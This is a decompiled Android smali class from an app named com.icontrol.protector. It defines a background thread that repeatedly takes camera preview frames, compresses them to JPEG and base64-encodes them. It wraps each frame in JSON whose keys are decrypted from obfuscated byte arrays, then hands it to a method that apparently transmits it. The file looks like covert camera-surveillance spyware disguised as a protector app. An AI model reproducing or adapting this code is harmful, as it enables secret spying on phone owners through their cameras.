.class Lcom/icontrol/protector/CameraCap$a$a$a;
.super Ljava/lang/Thread;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/icontrol/protector/CameraCap$a$a;->f(Lntidisestablish/neumonoul/floccinaucinih/m70;Lntidisestablish/neumonoul/floccinaucinih/dy;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic e:Lcom/icontrol/protector/CameraCap$a$a;


# direct methods
.method constructor <init>(Lcom/icontrol/protector/CameraCap$a$a;)V
    .locals 0

    iput-object p1, p0, Lcom/icontrol/protector/CameraCap$a$a$a;->e:Lcom/icontrol/protector/CameraCap$a$a;

    invoke-direct {p0}, Ljava/lang/Thread;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 12

    const/4 v0, 0x1

    :try_start_0
    sput-boolean v0, Lcom/icontrol/protector/CameraCap;->i:Z

    :catch_0
    :goto_0
    iget-object v1, p0, Lcom/icontrol/protector/CameraCap$a$a$a;->e:Lcom/icontrol/protector/CameraCap$a$a;

    iget-object v1, v1, Lcom/icontrol/protector/CameraCap$a$a;->a:Ljava/lang/Boolean;

    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_5

    if-eqz v1, :cond_1

    const/4 v1, 0x0

    const/4 v2, 0x0

    :try_start_1
    invoke-static {}, Lcom/icontrol/protector/CameraCap;->f()Ljava/lang/Object;

    move-result-object v3

    monitor-enter v3
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1
    .catch Ljava/lang/OutOfMemoryError; {:try_start_1 .. :try_end_1} :catch_4

    :try_start_2
    iget-object v4, p0, Lcom/icontrol/protector/CameraCap$a$a$a;->e:Lcom/icontrol/protector/CameraCap$a$a;

    iget-object v4, v4, Lcom/icontrol/protector/CameraCap$a$a;->b:Lcom/icontrol/protector/CameraCap$a;

    iget-object v4, v4, Lcom/icontrol/protector/CameraCap$a;->f:Lcom/icontrol/protector/CameraCap;

    invoke-static {v4}, Lcom/icontrol/protector/CameraCap;->g(Lcom/icontrol/protector/CameraCap;)Ljava/util/List;

    move-result-object v4

    invoke-interface {v4}, Ljava/util/List;->size()I

    move-result v4

    if-lez v4, :cond_0

    iget-object v4, p0, Lcom/icontrol/protector/CameraCap$a$a$a;->e:Lcom/icontrol/protector/CameraCap$a$a;

    iget-object v4, v4, Lcom/icontrol/protector/CameraCap$a$a;->b:Lcom/icontrol/protector/CameraCap$a;

    iget-object v4, v4, Lcom/icontrol/protector/CameraCap$a;->f:Lcom/icontrol/protector/CameraCap;

    invoke-static {v4}, Lcom/icontrol/protector/CameraCap;->g(Lcom/icontrol/protector/CameraCap;)Ljava/util/List;

    move-result-object v4

    invoke-interface {v4, v1}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v4

    check-cast v4, [B
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_1

    :try_start_3
    iget-object v2, p0, Lcom/icontrol/protector/CameraCap$a$a$a;->e:Lcom/icontrol/protector/CameraCap$a$a;

    iget-object v2, v2, Lcom/icontrol/protector/CameraCap$a$a;->b:Lcom/icontrol/protector/CameraCap$a;

    iget-object v2, v2, Lcom/icontrol/protector/CameraCap$a;->f:Lcom/icontrol/protector/CameraCap;

    invoke-static {v2}, Lcom/icontrol/protector/CameraCap;->g(Lcom/icontrol/protector/CameraCap;)Ljava/util/List;

    move-result-object v2

    invoke-interface {v2, v1}, Ljava/util/List;->remove(I)Ljava/lang/Object;
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    move-object v2, v4

    goto :goto_1

    :catchall_0
    move-exception v2

    goto :goto_3

    :catchall_1
    move-exception v4

    move-object v11, v4

    move-object v4, v2

    move-object v2, v11

    goto :goto_3

    :cond_0
    :goto_1
    :try_start_4
    monitor-exit v3
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_1

    :catch_1
    :goto_2
    move-object v4, v2

    goto :goto_4

    :goto_3
    :try_start_5
    monitor-exit v3
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    :try_start_6
    throw v2
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_2
    .catch Ljava/lang/OutOfMemoryError; {:try_start_6 .. :try_end_6} :catch_4

    :catch_2
    move-object v2, v4

    goto :goto_2

    :goto_4
    :try_start_7
    sget-object v2, Lcom/icontrol/protector/CameraCap;->f:Landroid/hardware/Camera;

    invoke-virtual {v2}, Landroid/hardware/Camera;->getParameters()Landroid/hardware/Camera$Parameters;

    move-result-object v2

    invoke-virtual {v2}, Landroid/hardware/Camera$Parameters;->getPreviewSize()Landroid/hardware/Camera$Size;

    move-result-object v3

    iget v9, v3, Landroid/hardware/Camera$Size;->width:I

    invoke-virtual {v2}, Landroid/hardware/Camera$Parameters;->getPreviewSize()Landroid/hardware/Camera$Size;

    move-result-object v2

    iget v2, v2, Landroid/hardware/Camera$Size;->height:I

    new-instance v10, Landroid/graphics/YuvImage;

    const/16 v5, 0x11

    const/4 v8, 0x0

    move-object v3, v10

    move v6, v9

    move v7, v2

    invoke-direct/range {v3 .. v8}, Landroid/graphics/YuvImage;-><init>([BIII[I)V

    new-instance v3, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v3}, Ljava/io/ByteArrayOutputStream;-><init>()V

    new-instance v4, Landroid/graphics/Rect;

    invoke-direct {v4, v1, v1, v9, v2}, Landroid/graphics/Rect;-><init>(IIII)V

    iget-object v2, p0, Lcom/icontrol/protector/CameraCap$a$a$a;->e:Lcom/icontrol/protector/CameraCap$a$a;

    iget-object v2, v2, Lcom/icontrol/protector/CameraCap$a$a;->b:Lcom/icontrol/protector/CameraCap$a;

    iget-object v2, v2, Lcom/icontrol/protector/CameraCap$a;->f:Lcom/icontrol/protector/CameraCap;

    invoke-static {v2}, Lcom/icontrol/protector/CameraCap;->h(Lcom/icontrol/protector/CameraCap;)I

    move-result v2

    invoke-virtual {v10, v4, v2, v3}, Landroid/graphics/YuvImage;->compressToJpeg(Landroid/graphics/Rect;ILjava/io/OutputStream;)Z

    invoke-virtual {v3}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v2
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_4
    .catch Ljava/lang/OutOfMemoryError; {:try_start_7 .. :try_end_7} :catch_4

    :try_start_8
    invoke-static {v2, v1}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v2

    new-instance v4, Lorg/json/JSONObject;

    invoke-direct {v4}, Lorg/json/JSONObject;-><init>()V

    const/4 v5, 0x4

    new-array v5, v5, [B

    fill-array-data v5, :array_0

    const/16 v6, 0x8

    new-array v7, v6, [B

    fill-array-data v7, :array_1

    invoke-static {v5, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    const/4 v7, 0x3

    new-array v8, v7, [B

    fill-array-data v8, :array_2

    new-array v9, v6, [B

    fill-array-data v9, :array_3

    invoke-static {v8, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v4, v5, v8}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v5, v7, [B

    fill-array-data v5, :array_4

    new-array v8, v6, [B

    fill-array-data v8, :array_5

    invoke-static {v5, v8}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    new-array v2, v7, [B

    fill-array-data v2, :array_6

    new-array v5, v6, [B

    fill-array-data v5, :array_7

    invoke-static {v2, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    new-array v5, v0, [B

    const/16 v7, -0x38

    aput-byte v7, v5, v1

    new-array v1, v6, [B

    fill-array-data v1, :array_8

    invoke-static {v5, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v4, v2, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-virtual {v4}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v1

    iget-object v2, p0, Lcom/icontrol/protector/CameraCap$a$a$a;->e:Lcom/icontrol/protector/CameraCap$a$a;

    iget-object v2, v2, Lcom/icontrol/protector/CameraCap$a$a;->b:Lcom/icontrol/protector/CameraCap$a;

    iget-object v4, v2, Lcom/icontrol/protector/CameraCap$a;->f:Lcom/icontrol/protector/CameraCap;

    iget-object v2, v2, Lcom/icontrol/protector/CameraCap$a;->e:Landroid/content/Context;

    invoke-static {v4, v2, v1}, Lcom/icontrol/protector/CameraCap;->i(Lcom/icontrol/protector/CameraCap;Landroid/content/Context;Ljava/lang/String;)V
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_3
    .catch Ljava/lang/OutOfMemoryError; {:try_start_8 .. :try_end_8} :catch_4

    goto :goto_5

    :catch_3
    :try_start_9
    iget-object v1, p0, Lcom/icontrol/protector/CameraCap$a$a$a;->e:Lcom/icontrol/protector/CameraCap$a$a;

    invoke-virtual {v1}, Lcom/icontrol/protector/CameraCap$a$a;->g()V

    :goto_5
    invoke-virtual {v3}, Ljava/io/ByteArrayOutputStream;->close()V
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_4
    .catch Ljava/lang/OutOfMemoryError; {:try_start_9 .. :try_end_9} :catch_4

    :catch_4
    const-wide/16 v1, 0x1

    :try_start_a
    invoke-static {v1, v2}, Ljava/lang/Thread;->sleep(J)V
    :try_end_a
    .catch Ljava/lang/InterruptedException; {:try_start_a .. :try_end_a} :catch_0
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_5

    goto/16 :goto_0

    :catch_5
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :cond_1
    return-void

    :array_0
    .array-data 1
        -0x43t
        -0x49t
        0x5at
        0x6et
    .end array-data

    :array_1
    .array-data 1
        -0x37t
        -0x32t
        0x2at
        0xbt
        -0x2ct
        -0x56t
        -0x44t
        0x57t
    .end array-data

    :array_2
    .array-data 1
        -0x15t
        -0x59t
        0x7ct
    .end array-data

    :array_3
    .array-data 1
        -0x78t
        -0x3at
        0x11t
        0x72t
        -0x8t
        -0x1bt
        0x57t
        0x2t
    .end array-data

    :array_4
    .array-data 1
        -0x46t
        -0x36t
        0x38t
    .end array-data

    :array_5
    .array-data 1
        -0x2dt
        -0x59t
        0x5ft
        0x4at
        0x79t
        -0x7bt
        0x1at
        0x74t
    .end array-data

    :array_6
    .array-data 1
        0x5bt
        0x46t
        -0x57t
    .end array-data

    :array_7
    .array-data 1
        0x38t
        0x33t
        -0x2dt
        0xet
        0x79t
        -0x30t
        -0x1t
        0x4t
    .end array-data

    :array_8
    .array-data 1
        -0x42t
        -0x24t
        -0x74t
        -0x52t
        -0x68t
        -0x4ft
        0x34t
        0x4ct
    .end array-data
.end method
